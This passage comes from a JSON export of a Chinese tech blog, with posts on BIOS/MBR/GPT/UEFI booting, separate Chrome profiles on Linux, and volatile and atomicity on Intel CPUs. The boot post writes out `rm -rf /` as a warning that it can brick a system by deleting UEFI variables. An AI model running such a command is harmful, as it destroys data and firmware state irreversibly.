loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader 在modern intel system，UEFI默认从/efi/boot/boot64.efi加载。这个路径可以作为一个参数配置 UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。 因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量 firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写） 在那些默认允许写的系统(typically, those with systemd)，rm -rf / 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through /sys ​","raw":"---\ntitle: Booting a System\ntags:\n- boot\n- unix/linux\ncategories:\n- 运维\ndate: 2018-09-17 09:22:08\n---\n\n## Legacy BIOS \n\n- 传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表\n- 无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as \"active\"的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做\"volume boot record\"\n- 第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的\"dead zone\"。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用\n- MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的\n\n### MBR\n\n- > MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.\n\n## EFI\n\n- Intel’s extensible firmware interface (EFI) \n- EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用\n\n### GPT\n\n- The EFI partitioning scheme, known as a “GUID partition table” or GPT\n\n  > A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.\n\n- 只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID\n\n  > The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.\n  >\n  > The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.\n\n-  > [Windows and GPT FAQ](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq)\n   >\n   > ##### Can a disk be both GPT and MBR?\n   >\n   > No. However, all GPT disks contain a Protective MBR.\n   >\n   > ##### What is a Protective MBR?\n   >\n   > The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.\n   >\n   > ##### Why does the GPT have a Protective MBR?\n   >\n   > The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don't know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.\n   >\n   > ##### Why would a GPT-partitioned disk appear to have an MBR on it?\n   >\n   > This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.\n   >\n\n-  如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘\n\n-  不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。\n\n### ESP \n\n- > The [EFI system partition](https://en.wikipedia.org/wiki/EFI_system_partition) (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.\n  >\n  > The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see [UEFI specification version 2.7, section 13.3.1.1](http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485)), but any conformant vendor can optionally add support for additional filesystems; for example, Apple [Macs](https://wiki.archlinux.org/index.php/Mac) support (and by default use) their own HFS+ filesystem drivers.\n\n- 因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。\n\n- > At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.\n\n### BOOT\n\n- 没有boot block（除了Protective MBR）\n\n- 在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader\n\n- 在modern intel system，UEFI默认从`/efi/boot/boot64.efi`加载。这个路径可以作为一个参数配置\n\n- UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。\n\n- 因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量\n\n- firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）\n\n- 在那些默认允许写的系统(typically, those with systemd)，`rm -rf /` 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through `/sys`\n\n  ​","content":"<h2 id=\"Legacy-BIOS\"><a href=\"#Legacy-BIOS\" class=\"headerlink\" title=\"Legacy BIOS\"></a>Legacy BIOS</h2><ul>\n<li>传统的bios假设boot device start with a record called MBR，MBR512个字节，包含first-stage boot loader（也叫boot block）和一个分区表</li>\n<li>无论是BIOS还是第一阶段的boot loader都没有足够的能力去读取标准的文件系统，所以第二阶段的boot loader的位置必须足够容易获取。在大多数场景下，boot block从MBR读取分区表，识别出那些marked as “active”的硬盘分区，然后其从这些分区的开头读取并运行第二阶段boot loader，这个方案被叫做”volume boot record”</li>\n<li>第二阶段的boot loader还可以处于MBR和第一个磁盘分区之间的”dead zone”。由于历史原因，第一个磁盘分区从第64个disk block开始（MBR所在的那个是第0个block），所以这个区域包含有32KB的空间，这个空间足够包含一个文件系统驱动。这个方案通常被GRUB使用</li>\n<li>MBR boot block是OS-agnostic的，但是因为第二阶段的boot loader有多个版本可以安装，所以第二阶段的boot loader通常是了解操作系统和文件系统的，并且是可配置的</li>\n</ul>\n<h3 id=\"MBR\"><a href=\"#MBR\" class=\"headerlink\" title=\"MBR\"></a>MBR</h3><ul>\n<li><blockquote>\n<p>MBR disks support only four partition table entries. For more than four partitions, a secondary structure known as an extended partition is necessary. Extended partitions can then be subdivided into one or more logical disks.</p>\n</blockquote>\n</li>\n</ul>\n<h2 id=\"EFI\"><a href=\"#EFI\" class=\"headerlink\" title=\"EFI\"></a>EFI</h2><ul>\n<li>Intel’s extensible firmware interface (EFI) </li>\n<li>EFI演变成UEFI（unified EFI），被多家制造商支持，不过EFI仍然是更常使用的术语。EFI和UEFI基本上可以互换使用</li>\n</ul>\n<h3 id=\"GPT\"><a href=\"#GPT\" class=\"headerlink\" title=\"GPT\"></a>GPT</h3><ul>\n<li><p>The EFI partitioning scheme, known as a “GUID partition table” or GPT</p>\n<blockquote>\n<p>A partition is a contiguous space of storage on a physical or logical disk that functions as if it were a physically separate disk. Partitions are visible to the system firmware and the installed operating systems. Access to a partition is controlled by the system firmware before the system boots the operating system, and then by the operating system after it is started.</p>\n</blockquote>\n</li>\n<li><p>只有一种分区类型（没有诸如逻辑分区），可以任意多的分区数目，有16-byte的GUID</p>\n<blockquote>\n<p>The specification allows an almost unlimited number of partitions. However, the Windows implementation restricts this to 128 partitions. The number of partitions is limited by the amount of space reserved for partition entries in the GPT.</p>\n<p>The 16-byte partition type GUID, which is similar to a System ID in the partition table of an MBR disk, identifies the type of data that the partition contains and identifies how the partition is used, for example, whether it is a basic disk or a dynamic disk. Note that each GUID partition entry has a backup copy.</p>\n</blockquote>\n</li>\n<li><blockquote>\n<p><a href=\"https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/windows-and-gpt-faq\" target=\"_blank\" rel=\"noopener\">Windows and GPT FAQ</a></p>\n<h5 id=\"Can-a-disk-be-both-GPT-and-MBR\"><a href=\"#Can-a-disk-be-both-GPT-and-MBR\" class=\"headerlink\" title=\"Can a disk be both GPT and MBR?\"></a>Can a disk be both GPT and MBR?</h5><p>No. However, all GPT disks contain a Protective MBR.</p>\n<h5 id=\"What-is-a-Protective-MBR\"><a href=\"#What-is-a-Protective-MBR\" class=\"headerlink\" title=\"What is a Protective MBR?\"></a>What is a Protective MBR?</h5><p>The Protective MBR, beginning in sector 0, precedes the GPT partition table on the disk. The MBR contains one type 0xEE partition that spans the disk.</p>\n<h5 id=\"Why-does-the-GPT-have-a-Protective-MBR\"><a href=\"#Why-does-the-GPT-have-a-Protective-MBR\" class=\"headerlink\" title=\"Why does the GPT have a Protective MBR?\"></a>Why does the GPT have a Protective MBR?</h5><p>The Protective MBR protects GPT disks from previously released MBR disk tools such as Microsoft MS-DOS FDISK or Microsoft Windows NT Disk Administrator. These tools are not aware of GPT and don’t know how to properly access a GPT disk. Legacy software that does not know about GPT interprets only the Protected MBR when it accesses a GPT disk. These tools will view a GPT disk as having a single encompassing (possibly unrecognized) partition by interpreting the Protected MBR, rather than mistaking the disk for one that is unpartitioned.</p>\n<h5 id=\"Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it\"><a href=\"#Why-would-a-GPT-partitioned-disk-appear-to-have-an-MBR-on-it\" class=\"headerlink\" title=\"Why would a GPT-partitioned disk appear to have an MBR on it?\"></a>Why would a GPT-partitioned disk appear to have an MBR on it?</h5><p>This occurrs when you use an MBR-only-aware disk tool to access the GPT disk.</p>\n</blockquote>\n</li>\n<li><p>如果没有保护性的MBR，一些MBR-only的工具可能会认为该磁盘没有格式化所以去格式化该磁盘</p>\n</li>\n<li><p>不要使用不支持GPT的分区工具，这些工具会认为自己理解了磁盘布局，其实并没有。这是很危险的。</p>\n</li>\n</ul>\n<h3 id=\"ESP\"><a href=\"#ESP\" class=\"headerlink\" title=\"ESP\"></a>ESP</h3><ul>\n<li><blockquote>\n<p>The <a href=\"https://en.wikipedia.org/wiki/EFI_system_partition\" target=\"_blank\" rel=\"noopener\">EFI system partition</a> (also called ESP or EFISYS) is an OS independent partition that acts as the storage place for the EFI bootloaders, applications and drivers to be launched by the UEFI firmware. It is mandatory for UEFI boot.</p>\n<p>The UEFI specification mandates support for the FAT12, FAT16, and FAT32 filesystems (see <a href=\"http://www.uefi.org/sites/default/files/resources/UEFI%20Spec%202_7_A%20Sept%206.pdf#G17.1019485\" target=\"_blank\" rel=\"noopener\">UEFI specification version 2.7, section 13.3.1.1</a>), but any conformant vendor can optionally add support for additional filesystems; for example, Apple <a href=\"https://wiki.archlinux.org/index.php/Mac\" target=\"_blank\" rel=\"noopener\">Macs</a> support (and by default use) their own HFS+ filesystem drivers.</p>\n</blockquote>\n</li>\n<li><p>因为这只是一个普通的FAT分区，所以可以被操作系统挂载、读写。</p>\n</li>\n<li><blockquote>\n<p>At boot time, the firmware consults the GPT partition table to identify the ESP. It then reads the configured target application directly from a file in the ESP and executes it.</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"BOOT\"><a href=\"#BOOT\" class=\"headerlink\" title=\"BOOT\"></a>BOOT</h3><ul>\n<li><p>没有boot block（除了Protective MBR）</p>\n</li>\n<li><p>在UEFI 系统，并不需要boot loader，UEFI boot target 可以是UNIX/Linux kernel，这些kernel可以被配置为direct UEFI loading。不过，实践中，为了兼容legacy BIOSes，所以还是使用了boot loader</p>\n</li>\n<li><p>在modern intel system，UEFI默认从<code>/efi/boot/boot64.efi</code>加载。这个路径可以作为一个参数配置</p>\n</li>\n<li><p>UEFI定义了很多访问系统硬件的API，在这个意义上，其已经是一个小型操作系统了，甚至有UEFI-level add-on device drivers（使用处理器无关的语言编写，存储在ESP）。操作系统可以使用这些API访问硬件，也可以直接控制硬件。</p>\n</li>\n<li><p>因为UEFI有formal API，所以可以在运行的操作系统修改UEFI 变量</p>\n</li>\n<li><p>firmware可以被mounted read/write（从可以修改UEFI变量就可以知道确实可读写）</p>\n</li>\n<li><p>在那些默认允许写的系统(typically, those with systemd)，<code>rm -rf /</code> 可以永久的摧毁system at fireware level。并且，除了移除文件，rm还移除variables and other UEFI information accessible through <code>/sys</code></p>\n<p>​</p>\n</li>\n</ul>\n","slug":"Booting-a-System","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"boot","slug":"boot","permalink":"https://h-zex.github.io/tags/boot/"},{"name":"unix/linux","slug":"unix-linux","permalink":"https://h-zex.github.io/tags/unix-linux/"}]},{"title":"How to Have Two Chromes at Linux","date":"2018-09-10T13:26:34.000Z","path":"2018/09/10/How-to-Have-Two-Chromes-at-Linux/","text":"需求 由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。 而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。 那么，就需要两个chrome的环境 chrome的用户数据 linux下chrome的默认用户数据存储在/home/&lt;user-name&gt;/.config/google-chrome，可以使用--user-data-dir=DIR参数启动chrome来使得chrome使用另一个目录作为用户data目录 –user-data-dir=DIRSpecifies the directory that user data (your “profile”) is kept in. Defaults to $HOME/.config/google-chrome . Separate instances of GoogleChrome must use separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user datadirectory. 接下来 1234cd /home/&lt;user-name&gt;/.config/mv google-chrome xxx # 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息# 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。） 把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上--user-data-dir=DIR参数打开chrome即可 由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题） 从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome dpkg -x xxx.deb folder即可把deb包解压到folder文件夹中 然后使用使用chown命令修改folder/opt/google/chrome/chrome-sandbox的拥有者为root，然后使用chmod 4755修改该文件的权限，才可以使用这个chrome 使用方法，直接在folder/opt/google/chrome/目录下运行./chrome即可","raw":"---\ntitle: How to Have Two Chromes at Linux\ndate: 2018-09-10 21:26:34\ntags:\n- 运维\n- 小技巧\n- chrome\n- linux\ncategories:\n- 运维\n---\n\n### 需求\n\n- 由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。\n- 而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。\n- 那么，就需要两个chrome的环境\n\n### chrome的用户数据\n\n- linux下chrome的默认用户数据存储在`/home/<user-name>/.config/google-chrome`，可以使用`--user-data-dir=DIR`参数启动chrome来使得chrome使用另一个目录作为用户data目录\n   > --user-data-dir=DIR\n   > Specifies the directory that user data (your \"profile\") is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google\n   > Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data\n   > directory.\n- 接下来\n   ```shell\n   cd /home/<user-name>/.config/\n   mv google-chrome xxx \n   # 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息\n   # 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息\n   ```\n   接下来，打开chrome（不加--user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）\n- 把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上`--user-data-dir=DIR`参数打开chrome即可\n- 由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）\n\n\n### 从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome\n\n- `dpkg -x xxx.deb folder`即可把deb包解压到folder文件夹中\n- 然后使用使用`chown`命令修改`folder/opt/google/chrome/chrome-sandbox`的拥有者为root，然后使用`chmod 4755`修改该文件的权限，才可以使用这个chrome\n- 使用方法，直接在`folder/opt/google/chrome/`目录下运行`./chrome`即可\n","content":"<h3 id=\"需求\"><a href=\"#需求\" class=\"headerlink\" title=\"需求\"></a>需求</h3><ul>\n<li>由于Tampermonkey的脚本频繁更新，所以有点担心脚本的安全性问题。毕竟没有时间把源码都看一遍。</li>\n<li>而由于JavaScript的能力比较有限，所以，我认为，构造一个新的浏览器环境来运行这个脚本应该就可以解决问题。</li>\n<li>那么，就需要两个chrome的环境</li>\n</ul>\n<h3 id=\"chrome的用户数据\"><a href=\"#chrome的用户数据\" class=\"headerlink\" title=\"chrome的用户数据\"></a>chrome的用户数据</h3><ul>\n<li>linux下chrome的默认用户数据存储在<code>/home/&lt;user-name&gt;/.config/google-chrome</code>，可以使用<code>--user-data-dir=DIR</code>参数启动chrome来使得chrome使用另一个目录作为用户data目录<blockquote>\n<p>–user-data-dir=DIR<br>Specifies the directory that user data (your “profile”) is kept in.  Defaults to $HOME/.config/google-chrome .  Separate instances of  Google<br>Chrome  must  use  separate user data directories; repeated invocations of google-chrome will reuse an existing process for a given user data<br>directory.</p>\n</blockquote>\n</li>\n<li><p>接下来</p>\n <figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd /home/&lt;user-name&gt;/.config/</span><br><span class=\"line\">mv google-chrome xxx </span><br><span class=\"line\"><span class=\"meta\">#</span> 注意，不可以使用google-chrome.old，否则chrome还是会从这个文件夹获得用户名等信息</span><br><span class=\"line\"><span class=\"meta\">#</span> 我就是使用了google-chrome.old，结果打开新的chrome，chrome总是显示我已经登录了，然后新的google-chrome目录下的生成的新的Local State文件总是有我的个人信息</span><br></pre></td></tr></table></figure>\n<p> 接下来，打开chrome（不加–user-data-dir参数），chrome就会生成新的google-chrome文件夹，从而就可以获得一个全新的chrome环境。然后安装需要的插件和脚本（注意，不要登录账户然后选同步设置。）</p>\n</li>\n<li>把chrome新创建的这个google-chrome文件夹名改为自己要的名字，然后以后要使用新环境就直接加上<code>--user-data-dir=DIR</code>参数打开chrome即可</li>\n<li>由于chrome的用户data似乎对chrome版本比较敏感，所以还需要其他措施（当然没有似乎问题也不大——我67使用69的配置只是报个错，没有其他问题）</li>\n</ul>\n<h3 id=\"从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome\"><a href=\"#从chrome-的deb解压获得chrome从而不需要安装也可以使用chrome\" class=\"headerlink\" title=\"从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome\"></a>从chrome 的deb解压获得chrome从而不需要安装也可以使用chrome</h3><ul>\n<li><code>dpkg -x xxx.deb folder</code>即可把deb包解压到folder文件夹中</li>\n<li>然后使用使用<code>chown</code>命令修改<code>folder/opt/google/chrome/chrome-sandbox</code>的拥有者为root，然后使用<code>chmod 4755</code>修改该文件的权限，才可以使用这个chrome</li>\n<li>使用方法，直接在<code>folder/opt/google/chrome/</code>目录下运行<code>./chrome</code>即可</li>\n</ul>\n","slug":"How-to-Have-Two-Chromes-at-Linux","categories":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/categories/运维/"}],"tags":[{"name":"运维","slug":"运维","permalink":"https://h-zex.github.io/tags/运维/"},{"name":"小技巧","slug":"小技巧","permalink":"https://h-zex.github.io/tags/小技巧/"},{"name":"chrome","slug":"chrome","permalink":"https://h-zex.github.io/tags/chrome/"},{"name":"linux","slug":"linux","permalink":"https://h-zex.github.io/tags/linux/"}]},{"title":"关于volatile、单条指令的原子性","date":"2018-09-09T10:08:21.000Z","path":"2018/09/09/关于volatile、单条指令的原子性/","text":"volatile 以下说的是C/C++的volatile CSAPP的信号handler中说，对于shared变量，要用volatile修饰，即使是全局变量也如此。 虽然我使用clang 3.8试验，在几种常见情况下，全局变量都不会被缓存在寄存器，但是还是有必要这样做。 至于内存重排序，比如 1234567// thread 1Object c = init();bool isReady = true// thread 2while(isReady==false);// use Object c 因为内存重排序，所以可能使用 Object c时还没有被初始化 Intel 的Software Developer’s Manual，有Memory Ordering的介绍 C++、Java等还有自己的memory model 在非本地跳转中，volatile用的比较多。因为非本地跳转会加载存储在env中的环境（包括寄存器的值） 单条汇编的原子性 CSAPP的内嵌汇编的web aside中 To specify that an instruction should be) executed atomically, a special lock prefix byte (with code 0xF0) is included in the machine code immediately before the instruction. This is written in assembly by writing lock as if it were an instruction on a separate line before the instruction that is to be executed atomically. Intel对于连接在同一个system bus上的多处理器的管理机制 注意，以下都是基于Intel® 64 and IA-32 Architectures Software Developer’s Manual (2018 5 18), Vol.3A ch8 The Intel 64 and IA-32 architectures provide mechanisms for managing and improving the performance of multiple processors connected to the same system bus. 这些机制的特性 保证内存一致性 To maintain system memory coherency. When two or more processors are attempting simultaneously to access the same address in system memory, some communication mechanism or memory access protocol must be available to promote data coherency and, in some instances, to allow one processor to temporarily lock a memory location. 保证cache的一致性。比如一个shared变量被缓存在不同processor的L1 cache，那么其中一个processor修改了这个变量，其他processor要如何感知。具体可以看MESI Protocol To maintain cache consistency — When one processor accesses data cached on another processor, it must not receive incorrect data. If it modifies data, all other processors that access that data must receive the modified data. 可预测的内存写顺序 To allow predictable ordering of writes to memory. In some circumstances, it is important that memory writes be observed externally in precisely the same order as programmed. 分派中断处理 To distribute interrupt handling among a group of processors — When several processors are operating in a system in parallel, it is useful to have a centralized mechanism for receiving interrupts and distributing them to available processors for servicing. To increase system performance by exploiting the multi-threaded and multi-process nature of contemporary operating systems and applications. Guaranteed Atomic Operations atomically的含义 That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location. Intel还支持通过bus locking来实现对shared area of memory的操作，不过这个不是默认行为。 如果是对于cache中的内存操作，不适用bus lock，而是用processor’s cache coherency protocols来保证原子操作时，其他对于这内存位置的cache被正确管理 The Intel486 processor (and newer processors since) guarantees that the following basic memory operations will always be carried out atomically: Reading or writing a byte Reading or writing a word aligned on a 16-bit boundary Reading or writing a doubleword aligned on a 32-bit boundary The Pentium processor (and newer processors since) guarantees that the following additional memory operations will always be carried out atomically: Reading or writing a quadword aligned on a 64-bit boundary 16-bit accesses to uncached memory locations that fit within a 32-bit data bus The P6 family processors (and newer processors since) guarantee that the following additional memory operation will always be carried out atomically: Unaligned 16-, 32-, and 64-bit accesses to cached memory that fit within a cache line 以上三个保证我也不太清楚memory operations是不是不包括对cache的operations，比如说，某变量缓存在某处理器的L1 cache中，然后对其进行读写，每个读写操作是否对于其他processor来说也是原子的 Accesses to cacheable memory that are split across cache lines and page boundaries are not guaranteed to be atomic by the Intel Core 2 Duo, Intel® Atom™, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, P6 family, Pentium, and Intel486 processors. The Intel Core 2 Duo, Intel Atom, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, and P6 family processors provide bus control signals that permit external memory subsystems to make split accesses atomic; (however, nonaligned data accesses will seriously impact the performance of the processor and should be avoided.) An x87 instruction or an SSE instructions that accesses data larger than a quadword may be implemented using multiple memory accesses. If such an instruction stores to memory, some of the accesses may complete (writing to memory) while another causes the operation to fault for architectural reasons (e.g. due an page-table entry that is marked “not present”). In this case, the effects of the completed accesses may be visible to software even though the overall instruction caused a fault. If TLB invalidation has been delayed (see Section 4.10.4.4), such page faults may occur even if all accesses are to the same page. ….(原文还有多个section，讲述bus 的lock等内容)","raw":"---\ntitle: 关于volatile、单条指令的原子性\ndate: 2018-09-09 18:08:21\ntags:\n- Intel\n- volatile\n- 原子性\ncategories:\n- OS\n- Computer architecture\n---\n\n## volatile\n\n- 以下说的是C/C++的volatile\n- CSAPP的信号handler中说，对于shared变量，要用volatile修饰，即使是全局变量也如此。\n- 虽然我使用clang 3.8试验，在几种常见情况下，全局变量都不会被缓存在寄存器，但是还是有必要这样做。\n- 至于内存重排序，比如\n   ```c\n   // thread 1\n   Object c = init();\n   bool isReady = true\n\n   // thread 2\n   while(isReady==false);\n   // use Object c \n   ```\n   因为内存重排序，所以可能使用 Object c时还没有被初始化\n   Intel 的Software Developer’s Manual，有`Memory Ordering`的介绍\n   C++、Java等还有自己的memory model\n- 在非本地跳转中，volatile用的比较多。因为非本地跳转会加载存储在env中的环境（包括寄存器的值）\n\n## 单条汇编的原子性\n\n- CSAPP的内嵌汇编的web aside中\n   > To specify that an instruction should be) executed atomically, a special lock prefix byte (with code 0xF0) is included in the machine code immediately before the instruction. This is written in assembly by writing lock as if it were an instruction on a separate line before the instruction that is to be executed atomically.\n\n## Intel对于**连接在同一个system bus上**的多处理器的管理机制\n\n> - 注意，以下都是基于*Intel® 64 and IA-32 Architectures Software Developer’s Manual* (2018 5 18), Vol.3A ch8\n> - The Intel 64 and IA-32 architectures provide mechanisms for managing and improving the performance of multiple processors connected to the same system bus. \n\n### 这些机制的特性\n\n- 保证内存一致性\n   > To maintain system memory coherency. When two or more processors are attempting simultaneously to access the same address in system memory, some communication mechanism or memory access protocol must be available to promote data coherency and, in some instances, to allow one processor to temporarily lock a memory location.\n- 保证cache的一致性。比如一个shared变量被缓存在不同processor的L1 cache，那么其中一个processor修改了这个变量，其他processor要如何感知。具体可以看[MESI Protocol](https://en.wikipedia.org/wiki/MESI_protocol)\n   > To maintain cache consistency — When one processor accesses data cached on another processor, it must not receive incorrect data. If it modifies data, all other processors that access that data must receive the modified data.\n- 可预测的内存写顺序\n   > To allow predictable ordering of writes to memory. In some circumstances, it is important that memory writes be observed externally in precisely the same order as programmed. \n- 分派中断处理\n   >  To distribute interrupt handling among a group of processors — When several processors are operating in a system in parallel, it is useful to have a centralized mechanism for receiving interrupts and distributing them to available processors for servicing.\n- > To increase system performance by exploiting the multi-threaded and multi-process nature of contemporary operating systems and applications.\n\n### Guaranteed Atomic Operations\n\n- `atomically`的含义\n  > That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.\n- Intel还支持通过bus locking来实现对shared area of memory的操作，不过这个不是默认行为。\n- 如果是对于cache中的内存操作，不适用bus lock，而是用processor's cache coherency protocols来保证原子操作时，其他对于这内存位置的cache被正确管理\n- The Intel486 processor (and newer processors since) guarantees that the following basic **memory operations** will always be carried out atomically:\n   - Reading or writing a byte\n   - Reading or writing a word aligned on a 16-bit boundary\n   - Reading or writing a doubleword aligned on a 32-bit boundary\n- The Pentium processor (and newer processors since) guarantees that the following additional **memory operations** will always be carried out atomically:\n   - Reading or writing a quadword aligned on a 64-bit boundary\n   - 16-bit accesses to uncached memory locations that fit within a 32-bit data bus\n- The P6 family processors (and newer processors since) guarantee that the following additional memory operation will always be carried out atomically:\n   - Unaligned 16-, 32-, and 64-bit accesses to cached memory that fit within a cache line\n- 以上三个保证我也不太清楚**memory operations**是不是不包括对cache的operations，比如说，某变量缓存在某处理器的L1 cache中，然后对其进行读写，每个读写操作是否对于其他processor来说也是原子的\n- Accesses to cacheable memory that are split across cache lines and page boundaries are not guaranteed to be atomic by the Intel Core 2 Duo, Intel® Atom™, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, P6 family, Pentium, and Intel486 processors.\n- The Intel Core 2 Duo, Intel Atom, Intel Core Duo, Pentium M, Pentium 4, Intel Xeon, and P6 family processors provide bus control signals that permit external memory subsystems to make split accesses atomic; (however, nonaligned data accesses will seriously impact the performance of the processor and should be avoided.)\n- An x87 instruction or an SSE instructions that accesses data larger than a quadword may be implemented using multiple memory accesses. If such an instruction stores to memory, some of the accesses may complete (writing to memory) while another causes the operation to fault for architectural reasons (e.g. due an page-table entry that is marked “not present”). In this case, the effects of the completed accesses may be visible to software even though the overall instruction caused a fault. If TLB invalidation has been delayed (see Section 4.10.4.4), such page faults may occur even if all accesses are to the same page.\n\n### ....(原文还有多个section，讲述bus 的lock等内容)\n","content":"<h2 id=\"volatile\"><a href=\"#volatile\" class=\"headerlink\" title=\"volatile\"></a>volatile</h2><ul>\n<li>以下说的是C/C++的volatile</li>\n<li>CSAPP的信号handler中说，对于shared变量，要用volatile修饰，即使是全局变量也如此。</li>\n<li>虽然我使用clang 3.8试验，在几种常见情况下，全局变量都不会被缓存在寄存器，但是还是有必要这样做。</li>\n<li><p>至于内存重排序，比如</p>\n <figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// thread 1</span></span><br><span class=\"line\">Object c = init();</span><br><span class=\"line\"><span class=\"keyword\">bool</span> isReady = <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// thread 2</span></span><br><span class=\"line\"><span class=\"keyword\">while</span>(isReady==<span 